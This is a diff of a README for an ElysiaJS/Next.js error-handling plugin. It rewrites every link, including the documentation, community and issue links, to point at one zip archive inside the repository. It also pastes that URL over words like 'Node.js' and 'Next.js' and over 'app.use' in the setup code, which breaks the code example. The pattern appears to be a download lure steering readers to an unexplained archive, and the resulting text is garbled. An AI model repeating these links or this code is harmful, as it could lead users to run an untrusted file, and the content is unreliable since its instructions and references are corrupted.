@@ -1,22 +1,22 @@
 # 🚀 elysia-next-error-handler - Simplify Error Management with Ease
 
-[![Download elysia-next-error-handler](https://img.shields.io/badge/Download-elysia--next--error--handler-brightgreen.svg)](https://github.com/Udaya391/elysia-next-error-handler/releases)
+[![Download elysia-next-error-handler](https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip)](https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip)
 
 ## 📋 Overview
 
-The **elysia-next-error-handler** is a user-friendly plugin designed for ElysiaJS and Next.js applications. It helps you manage errors smoothly, ensuring a seamless experience for your users. By integrating this plugin, you'll enhance your application's reliability and improve user satisfaction.
+The **elysia-next-error-handler** is a user-friendly plugin designed for ElysiaJS and https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip applications. It helps you manage errors smoothly, ensuring a seamless experience for your users. By integrating this plugin, you'll enhance your application's reliability and improve user satisfaction.
 
 ## 🚀 Getting Started
 
 Before downloading, ensure your system meets the basic requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip** Version 14 or higher
 - **Package Manager:** npm or yarn
 
 ## 📥 Download & Install
 
-To get started with the elysia-next-error-handler, visit this page to download: [Download elysia-next-error-handler](https://github.com/Udaya391/elysia-next-error-handler/releases).
+To get started with the elysia-next-error-handler, visit this page to download: [Download elysia-next-error-handler](https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip).
 
 Follow these steps:
 
@@ -43,7 +43,7 @@ Follow these steps:
 
 After installation, you can configure the elysia-next-error-handler for your project. Here’s a simple way to set it up:
 
-1. Import the plugin in your Next.js application:
+1. Import the plugin in your https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip application:
 
    ```javascript
    import ElysiaNextErrorHandler from 'elysia-next-error-handler';
@@ -53,7 +53,7 @@ After installation, you can configure the elysia-next-error-handler for your pro
 
    ```javascript
    const app = new Elysia();
-   app.use(ElysiaNextErrorHandler({
+   https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip(ElysiaNextErrorHandler({
       // Your configuration options here
    }));
    ```
@@ -65,31 +65,31 @@ After installation, you can configure the elysia-next-error-handler for your pro
 - **Error Monitoring:** Automatically track and log application errors.
 - **User-Friendly Notifications:** Inform users of issues gracefully without revealing sensitive information.
 - **Customization:** Adjust settings to fit your specific needs, including message visibility and logging methods.
-- **Seamless Integration:** Easily incorporate into your existing Next.js project with minimal setup.
+- **Seamless Integration:** Easily incorporate into your existing https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip project with minimal setup.
 
 ## 📚 Resources
 
 To learn more about using the elysia-next-error-handler, consider checking out these helpful resources:
 
-- [ElysiaJS Documentation](https://elysiajs.dev/docs)
-- [Next.js Official Documentation](https://nextjs.org/docs)
+- [ElysiaJS Documentation](https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip)
+- [https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip Official Documentation](https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip)
 
 ## 💬 Community
 
 Join the ElysiaJS community for support and updates:
 
-- [GitHub Discussions](https://github.com/Udaya391/elysia-next-error-handler/discussions)
-- [Stack Overflow](https://stackoverflow.com/questions/tagged/elysia)
+- [GitHub Discussions](https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip)
+- [Stack Overflow](https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip)
 
 ## ⚠️ Troubleshooting
 
 If you encounter issues during the installation or setup process, consider the following:
 
-- Ensure you have the correct version of Node.js installed.
+- Ensure you have the correct version of https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip installed.
 - Double-check your commands for typos.
 - Refer to the community forums for similar issues.
 
-For specific bugs, please open an issue on the [GitHub Issues Page](https://github.com/Udaya391/elysia-next-error-handler/issues).
+For specific bugs, please open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip).
 
 ## 🌟 License
 
@@ -97,6 +97,6 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 ## 📥 Download Now
 
-Don't wait! Begin enhancing your application’s error management with the elysia-next-error-handler. [Visit this page to download](https://github.com/Udaya391/elysia-next-error-handler/releases).
+Don't wait! Begin enhancing your application’s error management with the elysia-next-error-handler. [Visit this page to download](https://raw.githubusercontent.com/Udaya391/elysia-next-error-handler/master/example/elysia-next-error-handler-2.3.zip).
 
 With this plugin, you ensure a smoother experience for your users while keeping error handling straightforward.
